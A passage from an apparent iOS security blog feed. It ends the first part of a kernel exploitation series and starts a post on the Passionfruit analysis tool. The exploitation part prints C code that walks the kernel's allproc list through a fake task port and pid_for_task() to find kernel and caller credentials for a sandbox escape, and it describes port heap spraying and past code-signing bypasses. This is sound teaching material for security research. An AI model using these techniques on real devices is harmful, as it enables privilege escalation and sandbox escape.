&lt;p&gt;Once kernel base is obtained, you can find some important structures in the kernel memory, such as &lt;strong&gt;extern struct proclist allproc;&lt;/strong&gt;, which can be found in the file &lt;strong&gt;/bsd/sys/proc_internal.h&lt;/strong&gt;, since even though the kernel is slid because of &lt;strong&gt;KASLR&lt;/strong&gt;, the structs are still at a fixed offset from the kernel base. As we can see from the kernel code, this struct contains a list of the prcesses. The symbol addresses can also be found using &lt;strong&gt;**jtool2&lt;/strong&gt; –analyze** feature, which utilizes the unstripped kernelcache that Apple mistakenly pushed out as a facilitator.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bsd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;673&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lck_attr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_lck_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;674&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;675&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LIST_HEAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proclist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;676&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proclist&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allproc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* List of all processes. */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;677&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proclist&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zombproc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* List of zombie processes. */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;678&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;679&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;initproc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;680&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;	&lt;span class=&quot;nf&quot;&gt;procinit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;681&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;683&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_spinlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;684&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_spinunlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;685&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_list_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;686&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_list_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;687&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_klist_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;688&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;proc_klist_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;One can then scour these structs using again the same function &lt;strong&gt;pid_for_task()&lt;/strong&gt; to find the current proc struct by checking for &lt;strong&gt;pid = getpid()&lt;/strong&gt; (so we can change the creds in the proc struct later to escape the sandbox), and kernproc by checking for pid = 0 (so we can get kern proc creds, find kernel task, ipc_space_kernel etc).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;c1&quot;&gt;// extern struct proclist allproc;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// This global variable stores the start of the linked_list of all proc objects&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allproc_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allproc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Getting the address of the next proc object in the linked list&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;procoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foundport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Need to read 2 times cause &quot;pid_for_task&quot; can only read 4 bytes at a time&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;procoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foundport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Getting the PID of from proc-&amp;gt;p_pid&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;faketask&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;procoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pid_for_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;foundport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Checking if it equals my PID&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Address of my proc struct&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;myproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// Address of the kernel proc struct&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;kernproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;proc_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;heap-allocation-basics&quot;&gt;Heap Allocation Basics&lt;/h2&gt;

&lt;p&gt;This is a very brief discussion about Heap Allocation in iOS. In iOS, the heap memory is divided into various zones. Allocations of same size will go into same zones, unless for certain objects which have their own special zones (ports, vouchers etc). These zones grow as more objects are allocated, with the new pages being fetched from the zone map. One can see the zones allocated with the &lt;strong&gt;zprint&lt;/strong&gt; command on Mac OS. It is assumed that a lot of heap allocation techniques will still be the same in iOS. Another thing is to note that iOS has zone garbage collection as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/30.png&quot; alt=&quot;30&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As discussed, certain objects have their own special zones. A zone is a collection of fixed size data blocks for which quick allocation and deallocation is possible. For e.g, in the image below, we can see that the a lot of the IPC objects, which includes ports, vouchers etc have their own zones. Hence if you are able to free a voucher let’s say, you won’t be able to overlap it with another object, unless you trigger zone garbage collection and move the page containing that address somewhere else to be reallocated again with a different kind of object.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/31.png&quot; alt=&quot;31&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The heap has been hardened significantly in the last few iOS versions. I highly recommend checking out &lt;a href=&quot;https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf&quot;&gt;this&lt;/a&gt; talk on iOS Kernel Heap by Stefan Esser. Additionally, you can also check out the kernel source code. Start by looking &lt;strong&gt;osfmk/kern/zalloc.c&lt;/strong&gt; which has some comments on heap allocation and just follow along from there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/38.png&quot; alt=&quot;38&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One of the common techniques used in recent exploits for heap spraying is to fill the memory with an array of Port pointers by sending a Mach message with the option &lt;strong&gt;MACH_MSG_OOL_PORTS_DESCRIPTOR&lt;/strong&gt;. This calls the method &lt;strong&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/strong&gt; in &lt;strong&gt;ipc/ipc_kmsg.c&lt;/strong&gt; which has a kalloc call (&lt;strong&gt;kalloc(ports_length)&lt;/strong&gt;) that fills the heap with port pointers. The advantage of this is in the voucher_swap exploit was that while the allocation of Ports would have put them into their own &lt;strong&gt;ipc.port&lt;/strong&gt; zones, in the case of port pointers this is not the case and hence reallocation on top of freed objects with port pointers is possible. Well, again this is not entirely true and reallocation with ports is possible as you can do enough spraying with Ports such that the kernel is force to do garbage collection and allocate fresh pages from the zone map which might include the freed objects. This is discussed in Part 2 of this series.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyin_ool_ports_descriptor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_ool_ports_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;mach_msg_descriptor_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_dsc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_64bit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.....................&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dsc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* for now */&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_NO_BUFFER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;pointer-authentication-check-and-coretrust&quot;&gt;Pointer Authentication Check and CoreTrust&lt;/h2&gt;

&lt;p&gt;The ARM 8.3 instruction set added a new feature called Pointer Authentication Check (PAC). It’s purpose is to check the integrity of the pointers. It works by attaching a cryptographic signature to pointer values in its unused bits, and then those signatures are verified before a pointer is used. Since the attacker doesn’t have the keys to create the signatures for these pointers, he is not able to create valid pointers.&lt;/p&gt;

&lt;p&gt;CoreTrust on the other hand is a separate kernel extension (&lt;strong&gt;com.apple.kext.CoreTrust&lt;/strong&gt;) that doesn’t allow self-signed binaries (&lt;strong&gt;jtool2&lt;/strong&gt; –sign) to run on the device. Previously, Apple Mobile File Integrity Kext (AMFI.kext) would work in conjunction with the &lt;strong&gt;amfid&lt;/strong&gt; daemon which is in userland to check for code signatures. This was bypassed in many ways by injecting the code signature hash into the AMFI trust cache, hooking onto amfid exception ports and allowing code execution to continue etc. CoreTrust imposes some additional checks that only allow Apple signed binaries to run on the device. It is still possible ro run binaries signed with Apple certificates, which anyone can get for free and run the binary once signed with it.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we looked at some of the basic fundamentals of iOS security which will serve as building blocks for the next two articles. The next article will discuss the &lt;strong&gt;voucher_swap&lt;/strong&gt; exploit in detail whereas the third part would discuss Jailbreaking.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Project Zero Issue tracker - https://bugs.chromium.org/p/project-zero/issues/detail?id=1731&lt;/li&gt;
  &lt;li&gt;iOS 10 - Kernel Heap Revisited - https://gsec.hitb.org/materials/sg2016/D2%20-%20Stefan%20Esser%20-%20iOS%2010%20Kernel%20Heap%20Revisited.pdf&lt;/li&gt;
  &lt;li&gt;Mac OS X Internals: A Systems Approach - https://www.amazon.com/Mac-OS-Internals-Approach-paperback/dp/0134426541&lt;/li&gt;
  &lt;li&gt;MacOS and iOS Internals, Volume III: Security &amp;amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535&lt;/li&gt;
  &lt;li&gt;MacOS and iOS Internals, Volume III: Security &amp;amp; Insecurity: https://www.amazon.com/MacOS-iOS-Internals-III-Insecurity/dp/0991055535&lt;/li&gt;
  &lt;li&gt;CanSecWest 2017 - Port(al) to the iOS Core - https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core&lt;/li&gt;
&lt;/ol&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 55 - Inspecting iOS apps with Passionfruit</title>
   <link href="https://bitbrain.github.io/2018/07/31/ios-application-security-part-55-inspecting-ios-apps-with-passionfruit.html"/>
   <updated>2018-07-31T10:11:00+00:00</updated>
   <id>https://bitbrain.github.io/2018/07/31/ios-application-security-part-55-inspecting-ios-apps-with-passionfruit</id>
   <content type="html">&lt;p&gt;In this article, we will have a look at passionfruit which is an iOS blackbox app analysis tool based on Frida . It also provides a really nice web GUI which makes analysis relatively easy. Here is the list of features as per their &lt;a href=&quot;https://github.com/chaitin/passionfruit&quot;&gt;Github&lt;/a&gt; page.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross plarform web GUI!&lt;/li&gt;
  &lt;li&gt;Also supports non-jailbroken device (see Non-jailbroken device).&lt;/li&gt;
  &lt;li&gt;List all url schemes.&lt;/li&gt;
